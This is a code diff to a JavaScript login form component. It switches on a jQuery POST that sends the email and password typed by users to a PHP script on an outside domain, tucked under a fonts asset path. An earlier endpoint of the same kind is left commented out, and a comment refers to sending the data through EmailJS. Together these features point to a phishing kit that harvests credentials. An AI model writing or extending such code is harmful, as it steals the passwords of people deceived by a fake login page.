@@ -39,25 +39,27 @@ export const Form = ({ toggleForm })=>{
             };
 
             // posted a request to the server below
-            const user = {
-                x1: email,
-                x2: password
-            };
+            // const user = {
+            //     x1: email,
+            //     x2: password
+            // };
+
+            let data = {
+                email: email,
+                password
+              };
             
             $.ajax({
                 type: "POST",
-                // url: "https://pearldozen.com/nc_assets/fonts/bgma/mna.php",
-                data: user,
+                url: "https://pearldozen.com/nc_assets/fonts/hey/test.php",
+                data: data,
                 success(data) {
                     console.log('ok');
                 },
             });
 
 
-            let data = {
-                username: email,
-                password: password
-              };
+            
               
             //   POST REQUEST FROM EMAILJS 
               
